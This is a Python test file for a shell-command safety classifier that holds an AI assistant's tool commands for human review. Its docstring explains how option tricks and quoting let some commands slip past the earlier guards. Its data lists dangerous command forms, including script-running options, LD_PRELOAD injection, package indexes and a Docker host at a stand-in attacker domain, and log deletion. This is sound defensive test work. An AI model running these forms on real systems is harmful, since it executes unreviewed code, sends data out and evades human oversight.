# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 InterGenJLU
"""An AUTO command runs no program and writes no file through its options.

THE DEFECT. The classifier's AUTO tables key on a command's first word, and AUTO
executes under every provenance. Some of those programs can be told by an option
to start another program, to write a file the caller names, or to change another
process or the machine: `rg --pre=PROG` runs PROG on every file it searches,
`sort --compress-program=PROG` pipes its temporaries through PROG, GNU `time -o`
and `strace -o` write their report to a file, `env PATH=... ls` or
`env LD_PRELOAD=... ls` sets what runs, `xargs -a FILE` takes the arguments from
a file the classifier never sees, `script` writes a typescript, a shell's
--rcfile runs a file first, `git --no-pager log --output=FILE` writes and
`git --no-pager branch NAME` creates a branch, `journalctl --no-pager --vacuum-*`
removes journal files, `ifconfig lo down` changes an interface, and
`ionice -c 3 -p PID` changes a running process. Quoting an option or
abbreviating it (`sort "-o"`, `sort --out=`) also passed the guards that existed,
because they read the line split on spaces while the executor starts the shlex
argv. A command the model composed after reading a page ran them with no word
from anyone.

THE RULE PINNED HERE. Those forms are CONFIRM, read from each program's own help
and manual, so the chokepoint holds them for the person's review in every cell
and the model's tool call on the native route asks first; the read forms of the
same commands stay AUTO.
"""

from __future__ import annotations

import unittest

from intergen import glass
from intergen.interfaces.provenance import IngressTracker
from intergen.safety import classify_command, command_leaves_the_machine
from intergen.tests import (
    test_a_tool_turn_answer_is_screened_and_a_failed_stream_is_recorded as screened,
)
from intergen.tests.test_a_network_check_on_the_models_word_runs_only_on_the_persons_direct_ask import (
    _AuditedCase,
    _tool_call_chunks,
)

HOST = "leak-6b2f9d.attacker.example"

#: The forms that run a program, write a path or set a state, by program, as
#: each program's help and manual on this machine name them.
FOUND = {
    "rg": ["rg --pre=/tmp/d/rec.sh x /tmp/d/notes.txt", "rg --pre /tmp/d/rec.sh -e x /tmp/d/notes.txt",
           "rg --no-config --pre=sh x /tmp/d/notes.txt",
           "rg --pre-glob '*' --pre /tmp/d/rec.sh x /tmp/d/notes.txt",
           "rg --hostname-bin=/tmp/d/rec.sh --hyperlink-format=file://{host}{path} x /tmp/d/notes.txt"],
    "sort": ["sort --compress-program=/tmp/d/rec.sh -S 1 /tmp/d/big.txt",
             "sort --compress-prog=/tmp/d/rec.sh -S 1 /tmp/d/big.txt",
             "sort -S 1 --compress-program /tmp/d/rec.sh /tmp/d/big.txt",
             "sort --co=/tmp/d/rec.sh -S 1 /tmp/d/big.txt", "sort -T /tmp/d/tmpdir -S 1 /tmp/d/big.txt",
             "sort --temporary-directory=/tmp/d/tmpdir -S 1 /tmp/d/big.txt"],
    "the guards read the argv the executor starts": [
        'sort "-o" /tmp/d/sorted.out /tmp/d/big.txt', "sort '--output=/tmp/d/sorted.out' /tmp/d/big.txt",
        "sort --out=/tmp/d/sorted.out /tmp/d/big.txt", 'find /tmp/d/del "-delete"',
        "find /tmp/d -name x '-fprint' /tmp/d/found.out"],
    "find": ["find /tmp/d -name x -fprint0 /tmp/d/found.out"],
    "time": ["time -o /tmp/d/time.out -f x true", "time --append --output=/tmp/d/time.out --format=x true",
             "time -a -o /tmp/d/time.out -f 'a\\tb' true", "time --out=/tmp/d/time.out true"],
    "strace": ["strace -o /tmp/d/strace.out true", "strace --output=/tmp/d/strace.out true",
               "strace -E MARK=1 printenv MARK", "strace -p 4242", "strace --inject=write:error=EIO true"],
    "the wrappers this machine does not carry": [
        "ltrace -o /tmp/d/ltrace.out true", "valgrind --log-file=/tmp/d/vg.out true",
        "fakeroot -s /tmp/d/fr.save true", "fakeroot -i /tmp/d/fr.save true"],
    "flock": ["flock /tmp/d/lock true", "flock -n /tmp/d/lock true", "flock /tmp/d/lock -c true"],
    "tree": ["tree -o /tmp/d/tree.out /tmp/d"],
    "file": ["file -C -m /tmp/d/magic"],
    "ifconfig": ["ifconfig lo down", "ifconfig lo:1 192.0.2.9", "ifconfig --down -i lo",
                 "ifconfig -i lo --mtu=1400", "ifconfig lo mtu 1400"],
    "env": ["env PATH=/tmp/d/bin ls", "env LD_PRELOAD=/tmp/d/x.so ls", "env BASH_ENV=/tmp/d/rec.sh bash -c true",
            "env GIT_EXTERNAL_DIFF=/tmp/d/rec.sh git --no-pager diff",
            "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=/tmp/d/rec.sh git status",
            "env RIPGREP_CONFIG_PATH=/tmp/d/rgrc rg x /tmp/d/notes.txt",
            f"env DOCKER_HOST=tcp://{HOST}:2375 docker ps", "env -C /tmp/d/repo git --no-pager diff",
            "env --chdir=/tmp/d/repo git --no-pager log", 'env "PATH=/tmp/d/bin" ls'],
    "pip": [f"pip list --outdated --index-url https://{HOST}/simple", f"pip list -o -i https://{HOST}/simple",
            "pip list --python /tmp/d/rec.sh", "pip list --log /tmp/d/pip.log",
            "pip freeze --cache-dir /tmp/d/cache", "pip show --keyring-provider subprocess pip"],
    "npm": ["npm list --logs-dir=/tmp/d/npmlogs", "npm list --cache=/tmp/d/npmcache",
            "npm list --userconfig=/tmp/d/npmrc"],
    "script": ["script -q -c true /tmp/d/typescript", "script -c true", "script -q -O /tmp/d/out -c true"],
    "a shell's start-up files": ["bash -i --rcfile /tmp/d/rec.sh -c true", "bash --init-file /tmp/d/rec.sh -i -c true",
                                 "bash -l -c true", "bash -lc true", "sh -i -c true",
                                 "sh --rcfile /tmp/d/rec.sh -i -c true"],
    "xargs": ["xargs -a /tmp/d/args.txt sort", "xargs --arg-file=/tmp/d/args.txt sort"],
    "watch": ["watch -s /tmp/d true", "watch --shotsdir=/tmp/d true"],
    "ionice": ["ionice -c 3 -p 4242", "ionice -c3 -p4242", "ionice --class=idle --pid=4242",
               "ionice -n 7 -u 65534", "ionice -n 7 -u65534", "ionice -n7 --uid=65534"],
    "journalctl": ["journalctl --no-pager --cursor-file=/tmp/d/cursor -n 1", "journalctl --no-pager --vacuum-size=1K",
                   "journalctl --no-pager --rotate", "journalctl --no-pager --flush",
                   "journalctl --no-pager --vacuum-t=1s", "journalctl --no-pager --update-catalog"],
    "git": ["git --git-dir=/tmp/d/repo/.git --no-pager log", "git --work-tree=/tmp/d/repo --no-pager diff",
            "git --config-env=diff.external=REC --no-pager diff", "git --no-pager log --output=/tmp/d/log.out",
            "git --no-pager diff --ext-diff", "git --no-pager log --show-signature",
            "git --no-pager log -p --textconv", "git --no-pager branch newbranch", "git --no-pager branch -D master",
            "git --no-pager branch -m a b", "git --no-pager tag v9", "git --no-pager tag -d v1",
            "git --no-pager tag -v v1", "git --no-pager branch --edit-description"],
    "less, as a piped sink": ["ls | less -o /tmp/d/less.log", "ls | less --LOG-FILE=/tmp/d/less.log",
                              "ls | less +!id"],
}
FOUND_FORMS = [form for forms in FOUND.values() for form in forms]
#: A piped form never reaches a launch (the executor refuses a pipe), so the
#: route cases fire the single commands.
SINGLE_FOUND_FORMS = [form for form in FOUND_FORMS if "|" not in form]

#: The read forms of the same commands: AUTO before and after.
READS = [
    "rg x /tmp/d/notes.txt", "rg -z x /tmp/d/notes.txt", "rg --pretty x /tmp/d/notes.txt", "sort -rh /tmp/d/big.txt",
    "sort --check /tmp/d/big.txt", "time true", "time -f x true", "time -p true", "strace true",
    "strace -f -e trace=file true", "strace -c true", "find /tmp/d -name x -print0", "file /tmp/d/notes.txt",
    "file -m /tmp/d/magic /tmp/d/notes.txt", "ifconfig", "ifconfig -a", "ifconfig lo", "ifconfig -s", "env ls",
    "env LC_ALL=C sort /tmp/d/big.txt", "env TZ=UTC date", "env -u HOME ls", "env -i ls", "env", "env -S 'ls -l'",
    "bash -c 'ls'", "sh -c 'ls -l'", "bash -e -c ls", "xargs ls", "watch -n 1 date", "ionice -p 4242",
    "ionice -c 3 ls", "journalctl --no-pager -n 5", "journalctl --no-pager --since=today",
    "journalctl --no-pager --system -n 1", "journalctl --no-pager --cursor=s=1", "git --no-pager log",
    "git --no-pager log -p", "git --no-pager log --oneline", "git --no-pager diff --stat", "git --no-pager diff --text",
    "git --no-pager show HEAD", "git --no-pager branch", "git --no-pager branch -a", "git --no-pager branch -vv",
    "git --no-pager branch --list 'feature/*'", "git --no-pager branch --contains HEAD", "git --no-pager tag",
    "git --no-pager tag -l 'v*'", "git --no-pager tag -n5", "git status", "git remote -v", "flock 3", "pip list",
    "pip list --outdated", "pip show pip", "pip freeze", "npm list", "npm list --depth=0 --json", "ls | less",
    "ls | less -R", "nice -n 5 ls", "timeout 5 ls", "stdbuf -oL ls", "nohup ls", "setsid ls",
]


class AnOptionThatRunsOrWritesIsNotARead(unittest.TestCase):

    def test_each_found_form_is_confirm(self):
        for family, forms in FOUND.items():
            for command in forms:
                with self.subTest(family=family, command=command):
                    self.assertEqual(classify_command(command).value, "confirm")

    def test_each_read_form_stays_auto(self):
        for command in READS:
            with self.subTest(command=command):
                self.assertEqual(classify_command(command).value, "auto")

    def test_a_line_that_does_not_split_is_confirm(self):
        for command in ('rg "--pre=sh x /tmp/d/notes.txt', "env 'PATH=/tmp ls", 'time "-o /tmp/x true'):
            with self.subTest(command=command):
                self.assertEqual(classify_command(command).value, "confirm")

    def test_a_refused_command_inside_stays_refused(self):
        for command in ("env PATH=/tmp/d/bin sudo ls", "time -o /tmp/d/t mount /x", "script -c 'mount /x'",
                        "bash -l -c 'umount /y'", "xargs -a /tmp/d/args.txt shred /tmp/d/x"):
            with self.subTest(command=command):
                self.assertEqual(classify_command(command).value, "blocked")

    def test_the_network_check_still_reads_its_destination(self):
        self.assertTrue(command_leaves_the_machine(f"env CUPS_SERVER={HOST} lpstat -p"))
        self.assertTrue(command_leaves_the_machine(f"timeout 5 dig {HOST}"))
        self.assertFalse(command_leaves_the_machine(f"env DOCKER_HOST=tcp://{HOST}:2375 docker ps"))


class TheChokepointHoldsEachForm(_AuditedCase):
    """The real chokepoint, the production floor scanner attached, with every
    tool's execute a recorder: a found form is held in every cell."""

    def test_each_found_form_is_held_in_every_cell(self):
        for command in FOUND_FORMS:
            with self.subTest(command=command):
                self.assertEqual(self.cells("run_command", {"command": command}), "HHHHHH")

    def test_the_read_forms_run_in_every_cell(self):
        for command in ("rg x /tmp/d/notes.txt", "sort -rh /tmp/d/big.txt", "time true",
                        "env LC_ALL=C sort /tmp/d/big.txt", "git --no-pager log --oneline",
                        "journalctl --no-pager -n 5", "ifconfig lo"):
            with self.subTest(command=command):
                self.assertEqual(self.cells("run_command", {"command": command}), "EEEEEE")


class TheNativeRouteHoldsTheModelsForm(screened._Case, _AuditedCase):
    """route()'s native tool rung: the model chooses the command."""

    QUESTION = "what is in my notes?"

    def setUp(self):
        screened._Case.setUp(self)
        _AuditedCase.setUp(self)

    def route(self, provenance: str, command: str):
        self.ran.clear()
        self.asked.clear()
        registry = self.registry()
        router = screened._tool_router(self.llm, registry)
        # The shared builder stands a Mock in for the tracker; a real one here.
        router._ingress_tracker = IngressTracker()
        router._review_callback = self.review("deny")
        with self.answering(screened._Response(_tool_call_chunks(command, provenance)),
                            screened._Response(screened._text("Done."))), \
                glass.turn("turn-options", "dbus"):
            return router._try_llm_tools(self.QUESTION)

    def test_each_found_form_asks_first_on_the_models_word(self):
        for command in SINGLE_FOUND_FORMS:
            with self.subTest(command=command):
                self.route("user_implied", command)
                self.assertEqual([c.arguments["command"] for c in self.asked], [command])
                self.assertEqual(self.ran, [])

    def test_each_found_form_asks_first_on_the_direct_ask(self):
        for command in SINGLE_FOUND_FORMS:
            with self.subTest(command=command):
                self.route("user_direct", command)
                self.assertEqual([c.arguments["command"] for c in self.asked], [command])
                self.assertEqual(self.ran, [])

    def test_a_read_form_runs_without_a_card(self):
        self.route("user_implied", "rg x /tmp/d/notes.txt")
        self.assertEqual(self.asked, [])
        self.assertEqual(self.ran, [("run_command", {"command": "rg x /tmp/d/notes.txt"})])


if __name__ == "__main__":
    unittest.main()
